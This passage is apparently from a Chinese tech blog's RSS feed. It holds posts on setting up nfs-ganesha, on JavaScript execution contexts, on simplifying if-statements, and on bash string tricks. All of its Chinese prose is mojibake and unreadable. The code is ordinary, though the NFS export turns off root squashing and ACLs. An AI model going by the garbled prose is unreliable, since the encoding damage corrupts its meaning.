&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;connection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;disconnect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;BACKUP for &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; done&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dev&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>ç”¨æˆ·æ€çš„NFS Server</title>
      <link>https://rendoumi.com/posts/20220706-nfs_usermode/</link>
      <pubDate>Wed, 06 Jul 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220706-nfs_usermode/</guid>
      <description>&lt;p&gt;NFS Server å¾ˆå¸¸ç”¨ï¼Œä½†æ˜¯å‘ä¹Ÿæ˜¯å·¨å¤§çš„ã€‚ä¹‹å‰åœ¨äº¬ä¸œè¿ç»´ Hadoop é›†ç¾¤çš„æ—¶å€™ç¢°åˆ°è¿‡è„‘è£‚ï¼ŒåŸå› å°±æ˜¯ NFS å¼•èµ·çš„ã€‚&lt;/p&gt;
&lt;p&gt;å…³é”® NFS æ˜¯å†…æ ¸æ€çš„ï¼Œä¸€æ—¦å´©æºƒï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯çš„æ‰€æœ‰å‘½ä»¤ï¼Œlsã€dfã€duç­‰ç­‰ï¼Œç»Ÿç»Ÿæ— ååº”ï¼Œç»“æœæ˜¯å¾ˆæ‚²å‰§çš„ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹é¢è¦æ¨èä¸€ä¸‹ nfs-ganesha ï¼Œå®ƒæ˜¯ç”¨æˆ·æ€çš„nfs-serverï¼Œæ”¯æŒv3å’Œv4ï¼Œè€Œnfsç¼ºçœæ˜¯å†…æ ¸æ€çš„v3ã€‚&lt;/p&gt;
&lt;p&gt;å¼ºçƒˆæ¨èå¤§å®¶ç”¨è¿™ä¸ªï¼Œè€Œä¸æ˜¯ç”¨å†…æ ¸æ€çš„ï¼Œå¹¶ä¸” nfs-ganesha è¿˜æ˜¯æ”¯æŒ glusterFS çš„ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install -y centos-release-nfs-ganesha30.noarch
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/ganesha/ganesha.conf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%include /etc/ganesha/exports/gv0.conf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/ganesha/exports/gv0.conf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;EXPORT&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;Export_Id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;# Export ID unique to each export&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;Path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/mnt/upload&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;Pseudo&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; /upload&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    FSAL &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; VFS&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;Access_type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; RW&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;# Access permissions&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;Squash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; No_root_squash&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# To enable/disable root squashing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;Disable_ACL&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; TRUE&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# To enable/disable ACL&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;Protocols&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;# NFS protocols supported&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;Transports&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;UDP&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;TCP&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# Transport protocols supported&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;SecType&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;sys&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;     &lt;span class=&#34;c1&#34;&gt;# Security flavors supported&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#å¯åŠ¨&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl restart nfs-ganesha
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#æ‰‹åŠ¨mountçš„æ–¹æ³•&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mount -t nfs -o soft,intr,rsize&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;8192,wsize&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;8192,timeo&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;900,proto&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;tcp,vers&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; 192.168.31.2:/upload /mnt/nfs-upload
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#è‡ªåŠ¨mountçš„æ–¹æ³•&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /etc/fstab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;192.168.31.2:/upload /mnt/nfs-upload nfs rw,vers&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4,addr&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;192.168.31.2,clientaddr&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;192.168.31.8 &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„idå¯¹é½é—®é¢˜å¯èƒ½è¦ç”¨åˆ°rpcidmapd&lt;/p&gt;</description>
    </item>
    <item>
      <title>JavaScript åˆ°åº•æ˜¯å¦‚ä½•æ‰§è¡Œçš„å‘¢ -- JSçš„ä½œåŸç†</title>
      <link>https://rendoumi.com/posts/20220621-javascripts_how_to_run/</link>
      <pubDate>Tue, 21 Jun 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220621-javascripts_how_to_run/</guid>
      <description>&lt;h3 id=&#34;javascript-åˆ°åº•æ˜¯å¦‚ä½•å·¥ä½œçš„&#34;&gt;JavaScript åˆ°åº•æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ&lt;/h3&gt;
&lt;h4 id=&#34;ä¸€å·¥ä½œåŸç†&#34;&gt;ä¸€ã€å·¥ä½œåŸç†&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;JavaScriptåˆ°åº•æ˜¯ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;&lt;strong&gt;åŒæ­¥&lt;/strong&gt;è¿˜æ˜¯å¼‚æ­¥ï¼Ÿ&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;strong&gt;å•çº¿ç¨‹&lt;/strong&gt;è¿˜æ˜¯å¤šçº¿ç¨‹ï¼Ÿ&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;JavaScript ä¸­çš„ä¸€åˆ‡éƒ½å‘ç”Ÿåœ¨&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Execution Context&lt;/strong&gt; ï¼ˆæ‰§è¡Œä¸Šä¸‹æ–‡ï¼‰ä¸­&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ‚¨å¯ä»¥å‡è®¾è¿™ä¸ª&lt;em&gt;æ‰§è¡Œä¸Šä¸‹æ–‡&lt;/em&gt; æ˜¯ä¸€ä¸ªå¤§ç›’å­æˆ–ä¸€ä¸ªå®¹å™¨ï¼Œåœ¨å…¶ä¸­æ‰§è¡Œæ•´ä¸ª JavaScript ä»£ç ã€‚&lt;/li&gt;
&lt;li&gt;è¿™ä¸ªå¤§ç›’å­é‡Œæœ‰ä¸¤ä¸ªç»„ä»¶ï¼š
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Memoryï¼ˆå†…å­˜ç»„ä»¶ï¼‰ï¼š&lt;strong&gt;è¿™æ˜¯æ‰€æœ‰å˜é‡å’Œå‡½æ•°å­˜å‚¨ä¸º&lt;/strong&gt;é”®å€¼å¯¹&lt;/strong&gt;çš„åœ°æ–¹ã€‚è¿™ä¸ª**â€œå†…å­˜ç»„ä»¶â€&lt;strong&gt;ä¹Ÿç§°ä¸º&lt;/strong&gt;å˜é‡ç¯å¢ƒ**ã€‚å› æ­¤ï¼Œå®ƒæ˜¯ä¸€ç§ç¯å¢ƒï¼Œå…¶ä¸­æ‰€æœ‰è¿™äº›å˜é‡å’Œå‡½æ•°éƒ½å­˜å‚¨ä¸ºé”®å€¼å¯¹ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Codeï¼ˆä»£ç ç»„ä»¶ï¼‰ï¼š&lt;strong&gt;è¿™æ˜¯ä»£ç é€è¡Œæ‰§è¡Œçš„åœ°æ–¹ã€‚è¿™ä¸ª&lt;/strong&gt;â€œä»£ç ç»„ä»¶â€&lt;strong&gt;ä¹Ÿç§°ä¸º&lt;/strong&gt;æ‰§è¡Œçº¿ç¨‹&lt;/strong&gt;ã€‚æ‰€ä»¥ï¼Œè¿™ä¸ª&lt;strong&gt;æ‰§è¡Œçº¿ç¨‹&lt;/strong&gt;æ˜¯ä¸€ä¸ªå•çº¿ç¨‹ï¼Œæ•´ä¸ªä»£ç ä¸€æ¬¡åªæ‰§è¡Œä¸€è¡Œã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç»“è®ºï¼šJavaScript æ˜¯ä¸€ç§&lt;em&gt;åŒæ­¥å•çº¿ç¨‹&lt;/em&gt;è¯­è¨€ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;å•çº¿ç¨‹&lt;/strong&gt; æ„å‘³ç€ JavaScript ä¸€æ¬¡åªèƒ½æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;åŒæ­¥å•çº¿ç¨‹&lt;/strong&gt; æ„å‘³ç€ JavaScript ä¸€æ¬¡åªèƒ½ä»¥ç‰¹å®šé¡ºåºæ¯æ¬¡æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ã€‚è¿™æ„å‘³ç€å®ƒåªèƒ½åœ¨å½“å‰è¡Œå®Œæˆæ‰§è¡Œåè½¬åˆ°ä¸‹ä¸€è¡Œã€‚è¿™å°±æ˜¯&lt;strong&gt;åŒæ­¥å•çº¿ç¨‹&lt;/strong&gt;çš„æ„æ€ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¾ˆæƒŠè¯§å§ï¼Œå®é™… javascripts æœ‰å•çº¿ç¨‹ event loop å¤§å¾ªç¯æ¥å®Œæˆå¾ˆå¤šä¸å¯æ€è®®çš„äº‹æƒ…ã€‚&lt;/p&gt;
&lt;h4 id=&#34;äºŒå®é™…å·¥ä½œè¿‡ç¨‹åˆ†æ&#34;&gt;äºŒã€å®é™…å·¥ä½œè¿‡ç¨‹åˆ†æ&lt;/h4&gt;
&lt;h4 id=&#34;javascript-ä»£ç æ˜¯å¦‚ä½•æ‰§è¡Œçš„&#34;&gt;JavaScript ä»£ç æ˜¯å¦‚ä½•æ‰§è¡Œçš„ï¼Ÿ&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;å½“ä½ è¿è¡Œ JavaScript ä»£ç æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ä¼šåˆ›å»ºä¸€ä¸ª&lt;strong&gt;Execution Contextï¼ˆæ‰§è¡Œä¸Šä¸‹æ–‡ï¼‰&lt;/strong&gt;ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;è®©æˆ‘ä»¬ä½¿ç”¨å®é™…çš„ä»£ç æ¥ä¸¾ä¸ªä¾‹å­ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;var n = 2;
function square(num) {
  var ans = num * num;
  return ans;
}
var square2 = square(n);
var square4 = square(4);
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;æ‰§è¡Œä¸Šè¿°ä»£ç æ—¶ï¼Œä¼šåˆ›å»º ä¸€ä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡&lt;/p&gt;</description>
    </item>
    <item>
      <title>Javascriptsä¸­ifçš„ä¼˜åŒ–</title>
      <link>https://rendoumi.com/posts/20220615-javascripts_if/</link>
      <pubDate>Wed, 15 Jun 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220615-javascripts_if/</guid>
      <description>&lt;p&gt;Javascripts ä¸­çš„ if &amp;hellip; else ç”¨èµ·æ¥å€’æ˜¯å¾ˆæ–¹ä¾¿ï¼Œä½†æ˜¯çœ‹èµ·æ¥å°±ä¸èˆ’æœäº†&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-javascripts&#34; data-lang=&#34;javascripts&#34;&gt;if (true) {
}

if (true) {
}

if (true) {
  if (true) {
    if (true) {
    }
  } else {
  }
} else {
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¸Šé¢çœ‹èµ·æ¥å¾ˆé—¹å¿ƒå§ï¼Œä¸‹é¢è®²è®²ä¼˜åŒ–ï¼š&lt;/p&gt;
&lt;h4 id=&#34;ä¸€ä¸‰å…ƒä¼˜åŒ–&#34;&gt;ä¸€ã€ä¸‰å…ƒä¼˜åŒ–&lt;/h4&gt;
&lt;p&gt;if (ture) elseå¯ä»¥ç”¨ä¸‰å…ƒæ“ä½œç¬¦æ¥ä¼˜åŒ–å®ƒï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// Bad ğŸ˜¥
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Congratutions!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;warn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Oops, something went wrong!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// Great ğŸ¥°
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Congratutions&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;warn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Oops, something went wrong!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;äºŒä¸ä¼˜åŒ–&#34;&gt;äºŒã€ä¸ä¼˜åŒ–&lt;/h4&gt;
&lt;p&gt;trueçš„æƒ…å†µä¸‹æ‰æ‰§è¡Œå¯ä»¥ç”¨ä¸æ¥è¿›è¡Œä¼˜åŒ–ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// is equals to:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;ä¸‰æå‰è¿”å›&#34;&gt;ä¸‰ã€æå‰è¿”å›&lt;/h4&gt;
&lt;p&gt;å¦‚æœæœ‰å¤šä¸ªåˆ¤æ–­ï¼ŒæŒ‰ç…§å¤æ‚ç¨‹åº¦ï¼Œä»ä¸Šåˆ°ä¸‹ï¼Œæå‰è¿”å›ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Shellè¿›é˜¶æŠ€å·§</title>
      <link>https://rendoumi.com/posts/20220609-shell_tips/</link>
      <pubDate>Thu, 09 Jun 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220609-shell_tips/</guid>
      <description>&lt;p&gt;Shellè„šæœ¬çš„è¿›é˜¶æŠ€å·§ï¼š&lt;/p&gt;
&lt;h4 id=&#34;ä¸€string-ç±»çš„æŠ€å·§&#34;&gt;ä¸€ã€String ç±»çš„æŠ€å·§&lt;/h4&gt;
&lt;p&gt;Stringç±»å½“ä½œæ•°ç»„æ¥ä½¿ç”¨ï¼Œæ³¨æ„èŒƒå›´çš„ä¸‹æ ‡ï¼Œ0:4ï¼Œ4æœ€åè¦è¢«è¸¢æ‰ï¼Œå®é™…æ˜¯0-3ï¼Œå…±4ä¸ªå­—ç¬¦ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;string=&amp;#34;Bash is great!&amp;#34;

echo ${string:8} # great!
echo ${string:0:4} # Bash
echo ${string:8:-1} # great (-1: upto 1st element from right)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ•°ç»„çš„é•¿åº¦ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;string=&amp;#34;Bash is great!&amp;#34;;
len=${#string}
echo &amp;#34;len = $len&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å­—ç¬¦ä¸²çš„æ›¿æ¢ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;string=&amp;#34;Bash is great!!&amp;#34;
echo ${string/Bash/GNU Bash} # GNU Bash is great!!
echo ${string//!/.} # Bash is great..
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å¤§å°å†™æ›¿æ¢:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;string=&amp;#34;Bash&amp;#34;
echo ${string^^} # BASH
echo ${string,,} # bash
